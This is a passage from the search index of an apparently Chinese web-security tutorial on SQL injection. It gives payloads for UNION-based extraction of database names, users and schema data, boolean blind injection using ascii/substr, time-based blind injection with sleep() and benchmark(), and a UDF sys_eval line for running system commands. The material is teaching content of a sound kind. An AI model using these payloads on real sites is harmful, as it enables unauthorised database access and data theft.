<p>\u52a0\u8f7d\u6076\u610f<code>udf.so/udf.dll</code>\u4e5f\u53ef\u4ee5\u7528\u6765\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 <pre><code>1';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so'; -- # \u521b\u5efa\u7cfb\u7edf\u547d\u4ee4sys_eval\n</code></pre></p> </li> <li> <p>mysql_fake_sever     \u540e\u7eed\u5176\u4ed6\u8865\u5145\u5176\u4ed6\u77e5\u8bc6\u70b9\u540e\u8865\u5145</p> </li> </ol>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_6","title":"\u5176\u4ed6\u5b9e\u7528\u8bed\u53e5","text":"<ol> <li> <p><code>ORDER BY</code>\u8bed\u53e5\u7684\u7b80\u5355\u5e94\u7528</p> <p><code>ORDER BY</code> \u8bed\u53e5\u7528\u4e8e\u6839\u636e\u6307\u5b9a\u7684\u5217\u5bf9\u7ed3\u679c\u96c6\u8fdb\u884c\u6392\u5e8f\u3002</p> <p>\u57281'\u5224\u65ad\u7684\u4f8b\u5b50\u4e2d\uff0c<code>order by</code> \u8bed\u53e5\u7528\u4e8e\u731c\u89e3\u5b57\u6bb5\u6570\u548c\u5217\u6570\uff0c\u82e5\u4e0d\u5b58\u5728\u5219\u4f1a\u56de\u663e\u51fa\u9519</p> <p><code>1' order by n--+</code>   \uff0cn\u4e3a\u6307\u5b9a\u5217</p> <p><code>ORDER BY</code> \u8bed\u53e5\u9ed8\u8ba4\u6309\u7167\u5347\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\uff0c\u5982\u679c\u5e0c\u671b\u6309\u7167\u964d\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>DESC</code> \u5173\u952e\u5b57\uff0c\u4f8b\u5982</p> <p>\u4ee5\u5b57\u6bcd\u987a\u5e8f\u663e\u793a\u516c\u53f8\u540d\u79f0\uff08Company\uff09</p> <p><code>SELECT Company, OrderNumber FROM Orders ORDER BY Company</code></p> <p>\u4ee5\u9006\u5b57\u6bcd\u987a\u5e8f\u663e\u793a\u516c\u53f8\u540d\u79f0</p> <p><code>SELECT Company, OrderNumber FROM Orders ORDER BY Company DESC</code></p> </li> <li> <p><code>INSERT INTO</code>\u8bed\u53e5\uff0c\u7528\u4e8e\u5411\u8868\u4e2d\u63d2\u5165\u65b0\u7684\u884c\u6216\u5217</p> <ul> <li> <p><code>INSERT INTO \u8868\u540d\u79f0 VALUES (\u503c1, \u503c2,....</code></p> </li> <li> <p><code>INSERT INTO table_name (\u52171, \u52172,...) VALUES (\u503c1, \u503c2,....)</code></p> </li> </ul> </li> <li> <p><code>SQL UPDATE</code> \u8bed\u53e5\uff0c\u7528\u4e8e\u4fee\u6539\u8868\u4e2d\u6570\u636e</p> <ul> <li><code>UPDATE \u8868\u540d\u79f0 SET \u5217\u540d\u79f0 = \u65b0\u503c WHERE \u5217\u540d\u79f0 = \u67d0\u503c</code></li> </ul> </li> <li> <p><code>DELETE</code> \u8bed\u53e5\uff0c\u7528\u4e8e\u5220\u9664\u8868\u4e2d\u7684\u884c</p> <ul> <li><code>DELETE FROM \u8868\u540d\u79f0 WHERE \u5217\u540d\u79f0 = \u503c</code></li> </ul> <p>\u53ef\u4ee5\u5728\u4e0d\u5220\u9664\u8868\u7684\u60c5\u51b5\u4e0b\u5220\u9664\u6240\u6709\u7684\u884c\uff0c\u540c\u65f6\u4fdd\u6301\u8868\u7684\u7ed3\u6784\u3001\u5c5e\u6027\u548c\u7d22\u5f15\u5b8c\u6574</p> <ul> <li><code>DELETE FROM table_name</code></li> <li><code>DELETE * FROM table_name</code></li> </ul> <p>\u661f\u53f7\uff08*\uff09\u662f\u9009\u53d6\u6240\u6709\u5217\u7684\u5feb\u6377\u65b9\u5f0f\u3002</p> </li> </ol>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#sql_2","title":"SQL \u901a\u914d\u7b26","text":"<p>\u5728\u641c\u7d22\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u65f6\uff0cSQL \u901a\u914d\u7b26\u53ef\u4ee5\u66ff\u4ee3\u4e00\u4e2a\u6216\u591a\u4e2a\u5b57\u7b26\u3002</p> <p>\u5728 SQL \u4e2d\uff0c\u53ef\u4f7f\u7528\u4ee5\u4e0b\u901a\u914d\u7b26\uff1a</p> <p>\u901a\u914d\u7b26 \u63cf\u8ff0 %   \u4ee3\u8868\u96f6\u4e2a\u6216\u591a\u4e2a\u5b57\u7b26 _   \u4ec5\u66ff\u4ee3\u4e00\u4e2a\u5b57\u7b26 [charlist]  \u5b57\u7b26\u5217\u4e2d\u7684\u4efb\u4f55\u5355\u4e00\u5b57\u7b26 [^charlist]\u6216\u8005[!charlist]    \u4e0d\u5728\u5b57\u7b26\u5217\u4e2d\u7684\u4efb\u4f55\u5355\u4e00\u5b57\u7b26</p> <p><code>SELECT * FROM \u8868\u540d WHERE \u5217\u540d LIKE '[   ]'</code></p> <p>\u5728[  ]\u4e2d\uff0c\u53ef\u5229\u7528\u901a\u914d\u7b26\u67e5\u627e\u4e0e\u6307\u5b9a\u503c\uff08\u4f8b\u5982123\uff09\u76f8\u5173\u7684\u6570\u636e</p> <p><code>123%</code>\u4ee5123\u5f00\u5934\u7684\u6570\u636e\uff1b<code>%123%</code>\u5305\u542b123\u7684\u6570\u636e\uff1b<code>_123</code>\u7b2c\u4e00\u4e2a\u5b57\u7b26\u540e\u662f123\u7684\u6570\u636e\uff0c\u540c\u7406<code>1_2_3</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_7","title":"\u5176\u4ed6\u5e38\u89c1\u6ce8\u5165\u65b9\u6cd5","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#union","title":"<code>union</code>\u8054\u5408\u67e5\u8be2","text":"<p>\u901a\u8fc7union\u548c\u524d\u9762\u4e00\u6761SQL\u8bed\u53e5\u62fc\u63a5,\u5e76\u6784\u9020\u5176\u5217\u6570\u4e0e\u524d\u9762\u7684SQL\u8bed\u53e5\u5217\u6570\u76f8\u540c</p> <p>\u4f8b\u5982\uff1a<code>select 1,2,3 from table_name1 union select 4,5,6 from table_name2;</code></p> <p>\u539f\u67e5\u8be2\u7684\u5217\u6570\u4e3a <code>1,2,3</code> \u5171\u4e09\u5217\uff0c<code>union select</code>\u7684\u5217\u6570\u4e5f\u8981\u4e3a\u4e09\u4e2a \u5373 <code>4,5,6</code>\uff0c\u5b9e\u9645\u53ef\u4ee5\u66ff\u6362\u4e3a<code>4,database(),user()</code></p> <p>\u4e00\u4e9b\u5e38\u7528\u7684\u8054\u5408\u67e5\u8be2\u8bed\u53e5</p> <p><code>1' union select database(),user()#</code> \u8fd9\u91cc\u8981\u6c42\u539f\u67e5\u8be2\u7684\u5217\u6570\u4e3a2</p> <ul> <li> <p><code>database()</code>\u5c06\u4f1a\u8fd4\u56de\u5f53\u524d\u7f51\u7ad9\u6240\u4f7f\u7528\u7684\u6570\u636e\u5e93\u540d\u5b57.</p> </li> <li> <p><code>user()</code>\u5c06\u4f1a\u8fd4\u56de\u6267\u884c\u5f53\u524d\u67e5\u8be2\u7684\u7528\u6237\u540d.</p> </li> </ul> <p><code>1' union select version(),@@version_compile_os#</code></p> <ul> <li> <p><code>version()</code> \u83b7\u53d6\u5f53\u524d\u6570\u636e\u5e93\u7248\u672c.</p> </li> <li> <p><code>@@version_compile_os</code> \u83b7\u53d6\u5f53\u524d\u64cd\u4f5c\u7cfb\u7edf</p> </li> </ul> <p><code>1' union select table_name,table_schema from information_schema.tables where table_schema= '[ ]'#</code></p> <p>\u901a\u8fc7\u6b64\u8bed\u53e5\u53ef\u4ee5\u67e5\u8be2\u5230\u6307\u5b9a\u5e93\u5185\u7684\u6240\u6709\u8868\u548c\u8868\u540d\uff0c\u6700\u540e\u7684\u65b9\u6846\u4e2d\u586b\u5165\u60f3\u8981\u67e5\u8be2\u7684\u6570\u636e\u5e93\u540d\u5373\u53ef</p> <p><code>information_schema</code> \u662f <code>mysql</code> \u81ea\u5e26\u7684\u4e00\u5f20\u8868\uff0c\u8fd9\u5f20\u6570\u636e\u8868\u4fdd\u5b58\u4e86 Mysql \u670d\u52a1\u5668\u6240\u6709\u6570\u636e\u5e93\u7684\u4fe1\u606f,\u5982\u6570\u636e\u5e93\u540d\uff0c\u6570\u636e\u5e93\u7684\u8868\uff0c\u8868\u680f\u7684\u6570\u636e\u7c7b\u578b\u4e0e\u8bbf\u95ee\u6743\u9650\u7b49\u3002\u8be5\u6570\u636e\u5e93\u62e5\u6709\u4e00\u4e2a\u540d\u4e3a <code>tables</code> \u7684\u6570\u636e\u8868\uff0c\u8be5\u8868\u5305\u542b\u4e24\u4e2a\u5b57\u6bb5 table_name \u548c table_schema\uff0c\u5206\u522b\u8bb0\u5f55 DBMS \u4e2d\u7684\u5b58\u50a8\u7684\u8868\u540d\u548c\u8868\u540d\u6240\u5728\u7684\u6570\u636e\u5e93\u3002</p> <p><code>-1' union select 1,2,(concat_ws(char(),user(),version(),database()))%23</code></p> <p>\u80fd\u591f\u83b7\u53d6\u5f53\u524d\u6570\u636e\u5e93\u7684\u5e93\u540d\uff0c\u7248\u672c\u548c\u8fde\u63a5\u7528\u6237\uff0c\u5176\u4e2d<code>concat_ws()</code>\u51fd\u6570\u7684\u4f5c\u7528\u662f\u4ece\u6570\u636e\u5e93\u91cc\u53d6n\u4e2a\u5b57\u6bb5\u7ec4\u5408\u5230\u4e00\u8d77\u5e76\u7528\u7b26\u53f7\u5206\u5272\u663e\u793a\uff0c<code>char()</code>\u80fd\u591f\u5c06\u5341\u8fdb\u5236ASCII\u7801\u8f6c\u6362\u4e3a\u5b57\u7b26\uff0c%23\u4e3aurl\u7f16\u7801\u4e2d\u7684#</p> <ul> <li> <p><code>group_concat()</code>\u4e0e<code>concat_ws()</code>\u7684\u533a\u522b\u662f\u524d\u8005\u5c06\u5217\u7ec4\u5408\u663e\u793a\uff0c\u540e\u8005\u5c06\u884c\u7ec4\u5408\u663e\u793a</p> </li> <li> <p><code>information_schema</code>\uff1a\u8868\u793a\u6240\u6709\u4fe1\u606f\uff0c\u5305\u62ec\u5e93\u3001\u8868\u3001\u5217</p> </li> <li> <p><code>information_schema.tables</code>\uff1a\u8bb0\u5f55\u6240\u6709\u8868\u540d\u4fe1\u606f\u7684\u8868</p> </li> <li> <p><code>information_schema.columns</code>\uff1a\u8bb0\u5f55\u6240\u6709\u5217\u540d\u4fe1\u606f\u7684\u8868</p> </li> <li> <p><code>table_schema</code>\uff1a\u6570\u636e\u5e93\u7684\u540d\u79f0</p> </li> <li> <p><code>table_name</code>:\u8868\u540d</p> </li> <li> <p><code>column_name</code>:\u5217\u540d</p> </li> <li> <p><code>group_concat()</code>:\u663e\u793a\u6240\u6709\u67e5\u8be2\u5230\u7684\u6570\u636e</p> </li> </ul> <p>tips</p> <p><code>union select</code>\u53ef\u7528<code>union all select</code>/<code>union distinct select</code>/<code>union distinctrow select</code>\u4ee3\u66ff</p> <p><code>order by</code> \u53ef\u7528<code>group by</code>\u4ee3\u66ff</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_8","title":"\u5e03\u5c14\u76f2\u6ce8","text":"<p>\u5e03\u5c14\u76f2\u6ce8\u4e00\u822c\u9002\u7528\u4e8e\u9875\u9762\u6ca1\u6709\u56de\u663e\u5b57\u6bb5(\u4e0d\u652f\u6301\u8054\u5408\u67e5\u8be2)\uff0c\u4e14web\u9875\u9762\u8fd4\u56de<code>True</code> \u6216\u8005 <code>false</code>\uff0c\u6784\u9020SQL\u8bed\u53e5\uff0c\u5229\u7528and\uff0cor\u7b49\u5173\u952e\u5b57\u6765\u5176\u540e\u7684\u8bed\u53e5 true \u3001 false\u4f7fweb\u9875\u9762\u8fd4\u56detrue\u6216\u8005false\uff0c\u4ece\u800c\u8fbe\u5230\u6ce8\u5165\u7684\u76ee\u7684\u6765\u83b7\u53d6\u4fe1\u606f</p> <pre><code>ascii() \u51fd\u6570\uff0c\u8fd4\u56de\u5b57\u7b26ascii\u7801\u503c\n    \u53c2\u6570 : str\u5355\u5b57\u7b26\nlength() \u51fd\u6570\uff0c\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\n    \u53c2\u6570 : str \u5b57\u7b26\u4e32\nleft() \u51fd\u6570\uff0c\u8fd4\u56de\u4ece\u5de6\u81f3\u53f3\u622a\u53d6\u56fa\u5b9a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\n    \u53c2\u6570str,length\n    str : \u5b57\u7b26\u4e32\n    length\uff1a\u622a\u53d6\u957f\u5ea6\nsubstr()/substring() \u51fd\u6570 \uff0c \u8fd4\u56de\u4ecepos\u4f4d\u7f6e\u5f00\u59cb\u5230length\u957f\u5ea6\u7684\u5b50\u5b57\u7b26\u4e32\n    \u53c2\u6570\uff0cstr\uff0cpos\uff0clength\n    str: \u5b57\u7b26\u4e32\n    pos\uff1a\u5f00\u59cb\u4f4d\u7f6e\n    length\uff1a \u622a\u53d6\u957f\u5ea6\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_9","title":"\u6ce8\u5165\u6d41\u7a0b","text":"<p>\u4e00\u822c\u4e3a</p> \u70b9\u51fb\u5c55\u5f00/\u6536\u8d77 <p>\uff081\uff09\u6c42\u5f53\u524d\u6570\u636e\u5e93\u957f\u5ea6</p> <p>\uff082\uff09\u6c42\u5f53\u524d\u6570\u636e\u5e93\u8868\u7684ASCII</p> <p>\uff083\uff09\u6c42\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u8868\u7684\u4e2a\u6570</p> <p>\uff084\uff09\u6c42\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u5176\u4e2d\u4e00\u4e2a\u8868\u540d\u7684\u957f\u5ea6</p> <p>\uff085\uff09\u6c42\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u5176\u4e2d\u4e00\u4e2a\u8868\u540d\u7684ASCII</p> <p>\uff086\uff09\u6c42\u5217\u540d\u7684\u6570\u91cf</p> <p>\uff087\uff09\u6c42\u5217\u540d\u7684\u957f\u5ea6</p> <p>\uff088\uff09\u6c42\u5217\u540d\u7684ASCII</p> <p>\uff089\uff09\u6c42\u5b57\u6bb5\u7684\u6570\u91cf</p> <p>\uff0810\uff09\u6c42\u5b57\u6bb5\u5185\u5bb9\u7684\u957f\u5ea6</p> <p>\uff0811\uff09\u6c42\u5b57\u6bb5\u5185\u5bb9\u5bf9\u5e94\u7684ASCII</p> <p>\u6b65\u9aa4\u975e\u5e38\u7e41\u7410\uff0c\u5f53\u7136\u5927\u5bb6\u90fd\u4e0d\u624b\u6ce8</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#sql_3","title":"\u76f8\u5173sql\u8bed\u53e5","text":"\u70b9\u51fb\u5c55\u5f00/\u6536\u8d77"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_10","title":"\u6c42\u5f53\u524d\u6570\u636e\u5e93\u7684\u957f\u5ea6","text":"<p>\u601d\u8def\uff1a\u5229\u7528<code>length</code>\u6216\u8005<code>substr</code>\u51fd\u6570\u6765\u5b8c\u6210</p> <p><code>length</code>\u51fd\u6570</p> <ul> <li>str    \u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6</li> </ul> <p><code>substr</code>\u51fd\u6570</p> <ul> <li>str    \u5b57\u7b26\u4e32</li> <li>pos    \u622a\u53d6\u5b57\u7b26\u4e32\u5f00\u59cb\u4f4d\u7f6e</li> </ul> <p><code>length</code>    \u622a\u53d6\u5b57\u7b26\u7684\u957f\u5ea6</p> <p><code>length</code> \u51fd\u6570\u8fd4\u56de\u957f\u5ea6\uff0c\u4f8b\u59828\u662f\u5f53\u524d\u6570\u636e\u5e93'security'\u7684\u957f\u5ea6</p> <p><code>SELECT * from users WHERE id = 1 and (length(database())=8)</code></p> <ul> <li>\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>&gt;</code>\u3001<code>&lt;</code> \u7b26\u53f7\u6765\u8fdb\u4e00\u6b65\u7f29\u5c0f\u8303\u56f4</li> </ul> <p><code>SELECT * from users WHERE id = 1 and (length(database())&gt;8)</code></p> <ul> <li>\u5f53\u957f\u5ea6\u6b63\u786e\u5c31\u9875\u9762\u5c31\u663e\u793a\u6b63\u5e38\uff0c\u5176\u4f59\u9875\u9762\u5219\u663e\u793a\u9519\u8bef</li> </ul> <p><code>substr</code>\u51fd\u6570</p> <p>\u5728\u6784\u9020SQL\u8bed\u53e5\u4e4b\u65f6\uff0cand\u540e\u9762\u5982\u679c\u8ddf\u7740\u4e00\u4e2a\u5927\u4e8e0\u7684\u6570\uff0c\u90a3\u4e48SQL\u8bed\u53e5\u6b63\u786e\u6267\u884c\uff0c\u6240\u4ee5\u5229\u7528\u6b64\u7279\u6027\uff0c\u4f7f\u7528<code>substr</code>\u622a\u53d6\u5b57\u7b26\uff0c\u5f53\u622a\u53d6\u7684\u5b57\u7b26\u4e0d\u5b58\u5728\uff0c\u518d\u901a\u8fc7<code>ascii</code>\u51fd\u6570\u5904\u7406\u4e4b\u540e\u5c06\u4f1a\u53d8\u6210false\uff0c\u9875\u9762\u5c06\u56de\u663e\u9519\u8bef</p> <ul> <li><code>substr</code> \u8fd4\u56de\u5b50\u5b57\u7b26\u4e32</li> <li>8\u662f\u5f53\u524d\u6570\u636e\u5e93'security'\u7684\u957f\u5ea6 \uff0c\u4ece\u7b2c8\u4e2a\u5f00\u59cb\uff0c\u53d61\u4f4d\uff0c\u5219\u662f'y'</li> <li>\u5982\u679cpos\u4e3a9 \u90a3\u4e48\u5f00\u59cb\u4f4d\u7f6e\u5927\u4e8e\u5b57\u7b26\u4e32\u957f\u5ea6\uff0cascii\u51fd\u6570\u5904\u7406\u540e\u5c06\u53d8\u6210false</li> <li>and \u540e\u53ea\u8981\u4e0d\u4e3a 0, \u9875\u9762\u90fd\u4f1a\u8fd4\u56de\u6b63\u5e38</li> </ul> <p><code>SELECT * from users WHERE id = 1 and ascii(substr(database(),8,1))</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_11","title":"\u6c42\u5f53\u524d\u6570\u636e\u5e93\u540d","text":"<p>\u601d\u8def\uff1a\u5229\u7528<code>left</code> \u51fd\u6570\uff0c\u4ece\u5de6\u81f3\u53f3\u622a\u53d6\u5b57\u7b26\u4e32</p> <p>\u622a\u53d6\u5b57\u7b26\u5224\u65ad\u5b57\u7b26\u7684<code>ascii</code>\u7801\uff0c\u4ece\u800c\u786e\u5b9a\u5b57\u7b26</p> <p>-- \u4ece\u5de6\u81f3\u53f3\u622a\u53d6\u4e00\u4e2a\u5b57\u7b26</p> <p><code>SELECT * from users WHERE id = 1 and (left(database(),1)='s')</code></p> <p>-- \u4ece\u5de6\u81f3\u53f3\u622a\u53d6\u4e24\u4e2a\u5b57\u7b26</p> <p><code>SELECT * from users WHERE id = 1 and (left(database(),2)='se')</code></p> <p><code>SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),1,1)) = 115)</code></p> <p><code>SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),2,1)) = 101)</code></p> <p>\u4f7f\u7528<code>&gt;</code>\uff0c<code>&lt;</code> \u7b26\u53f7\u6765\u6bd4\u8f83\u67e5\u627e\uff0c\u627e\u5230\u4e00\u4e2a\u8303\u56f4\uff0c\u6700\u540e\u518d\u786e\u5b9a</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_12","title":"\u6c42\u5f53\u524d\u6570\u636e\u5e93\u5b58\u5728\u7684\u8868\u7684\u6570\u91cf","text":"<p><code>SELECT * from users WHERE id = 1 AND</code></p> <p><code>(select count(table_name) from information_schema.`TABLES`; where table_schema = database()) = 4</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_13","title":"\u6c42\u5f53\u524d\u6570\u636e\u5e93\u8868\u7684\u8868\u540d\u957f\u5ea6","text":"<ul> <li>length</li> </ul> <p><code>SELECT * from users WHERE id = 1 AND (LENGTH((select table_name from information_schema.`TABLES` where table_schema = database() LIMIT 0,1))) = 6</code></p> <ul> <li>substr</li> </ul> <p><code>SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),6,1))</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_14","title":"\u6c42\u8868\u540d","text":"<p><code>SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),1,1)) = 101</code></p> <p><code>SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),2,1)) = 109</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_15","title":"\u6c42\u6307\u5b9a\u8868\u4e2d\u5217\u7684\u6570\u91cf","text":"<p><code>SELECT * from users WHERE id = 1 AND (select count(column_name) from information_schema.columns where table_name = \"users\") = 3</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_16","title":"\u6c42\u6307\u5b9a\u8868\u4e2d\u5217\u7684\u957f\u5ea6","text":"<p><code>SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select column_name from information_schema.columns where table_name = \"users\" limit 0,1),2,1))</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_17","title":"\u6c42\u6307\u5b9a\u8868\u4e2d\u7684\u5217\u540d","text":"<p><code>SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select column_name from information_schema.columns where table_name = \"users\" limit 0,1),1,1)) = 105</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_18","title":"\u6c42\u6307\u5b9a\u8868\u4e2d\u67d0\u5b57\u6bb5\u7684\u6570\u91cf","text":"<p><code>SELECT * from users WHERE id = 1 AND (select count(username) from users) = 13</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_19","title":"\u6c42\u5b57\u6bb5\u957f\u5ea6","text":"<p><code>SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select username from users  limit 0,1),4,1))</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_20","title":"\u6c42\u5b57\u6bb5\u540d","text":"<p><code>SELECT * from users WHERE id = 1 and ASCII(SUBSTR((select username from users  limit 0,1),1,1))  = 68</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_21","title":"\u65f6\u95f4\u76f2\u6ce8","text":"<p>\u65f6\u95f4\u76f2\u6ce8\u53c8\u79f0\u5ef6\u8fdf\u6ce8\u5165\uff0c\u662f\u4e00\u79cd\u76f2\u6ce8\u7684\u624b\u6cd5, \u63d0\u4ea4\u5bf9\u6267\u884c\u65f6\u95f4\u654f\u611f\u7684\u51fd\u6570sql\u8bed\u53e5\uff0c\u901a\u8fc7\u6267\u884c\u65f6\u95f4\u7684\u957f\u77ed\u6765\u5224\u65ad\u662f\u5426\u6267\u884c\u6210\u529f\uff0c\u6bd4\u5982:\u6b63\u786e\u7684\u8bdd\u4f1a\u5bfc\u81f4\u65f6\u95f4\u5f88\u957f\uff0c\u9519\u8bef\u7684\u8bdd\u4f1a\u5bfc\u81f4\u6267\u884c\u65f6\u95f4\u5f88\u77ed\u3002SQLMAP\u3001\u7a7f\u5c71\u7532\u3001\u80e1\u841d\u535c\u7b49\u4e3b\u6d41\u6ce8\u5165\u5de5\u5177\u53ef\u80fd\u68c0\u6d4b\u4e0d\u51fa\uff0c\u53ea\u80fd\u624b\u5de5\u68c0\u6d4b\uff0c\u6216\u5229\u7528\u811a\u672c\u7a0b\u5e8f\u8dd1\u51fa\u7ed3\u679c\u3002</p> <p>\u65f6\u95f4\u76f2\u6ce8\u4e3b\u8981\u7528\u5230<code>sleep()</code>\u51fd\u6570\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709<code>benchmark()</code></p> <p>\u65f6\u95f4\u76f2\u6ce8\u6bd4\u5e03\u5c14\u76f2\u6ce8\u96be\u5ea6\u7a0d\u9ad8 \uff0c\u5173\u952e\u5728\u4e8e\u4e0d\u8bba\u4f60\u600e\u4e48\u8f93\u5165\u5c31\u662f\u4e0d\u62a5\u9519</p> <p>\u65f6\u95f4\u76f2\u6ce8\u7684sql\u8bed\u53e5\u5f88\u597d\u7406\u89e3\uff0c\u5982</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#sleepseconds","title":"sleep(seconds)","text":"<ul> <li>seconds: sleep\u7684\u79d2\u6570</li> </ul> <p><code>id= 1\u2019 or sleep(3) %23</code></p> <p>\u5982\u679c\u8fd9\u4e2a\u65f6\u5019\u76f4\u63a5\u670d\u52a1\u5668\u8fc7\u4e86\u4e09\u79d2\u624d\u53cd\u5e94\uff0c\u90a3\u4e48\u5c31\u5b58\u5728\u65f6\u95f4\u6ce8\u5165</p> <p>\u4e5f\u53ef\u4ee5\u6dfb\u52a0if\u8bed\u53e5\uff0c\u63a7\u5236if\u7b2c\u4e00\u4e2a\u53c2\u6570</p> <p><code>id= 1\u2019 or if(1,sleep(3),0) %23</code></p> <p>\u5982\u679c\u67d0\u4e00\u4e2a\u6761\u4ef6\u6b63\u786e\u5c31\u5ef6\u8fdf\u4e09\u79d2\uff0c\u5982\u679c\u9519\u8bef\u5c31\u8fd4\u56de0 (\u4e5f\u5c31\u662fif\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a1)     </p> <p>\u5177\u4f53\u7684\u6ce8\u5165\u8bed\u53e5\u793a\u4f8b\u5982\u4e0b</p> <p><code>id= 1\u2019 or if((select table_name from information_schema.tables where table_schema=database() limit 0,1),sleep(3),0) %23</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#benchmarkcount-expr","title":"benchmark(count, expr)","text":"<ul> <li>count: \u6267\u884c\u6b21\u6570\uff08\u5fc5\u987b\u4e3a\u6b63\u6574\u6570\uff09</li> <li>expr: \u8981\u91cd\u590d\u6267\u884c\u7684\u8868\u8fbe\u5f0f\uff08\u901a\u5e38\u662f\u4e00\u4e2a\u8ba1\u7b97\u5bc6\u96c6\u578b\u64cd\u4f5c\uff09</li> </ul> <p>MySQL \u4f1a\u8ba1\u7b97 expr \u6307\u5b9a\u7684\u8868\u8fbe\u5f0f count \u6b21\uff0c\u8fd4\u56de\u7ed3\u679c\u59cb\u7ec8\u662f 0</p> <p><code>select if(1=1,benchmark(10000000,md5('test')),0)</code></p> <p>\u5982\u679c\u6761\u4ef6\u4e3a\u771f\uff0c\u5219\u6267\u884c\u5927\u91cf\u8ba1\u7b97\u5bfc\u81f4\u5ef6\u8fdf\uff1b\u4e3a\u5047\u5219\u7acb\u5373\u8fd4\u56de\u3002</p> <p>\u4f8b\u5982\u63a2\u6d4b\u6570\u636e\u5e93\u540d\u957f\u5ea6</p> <p><code>select if(length(database())=8, benchmark(10000000,md5('test')), 0)</code></p> 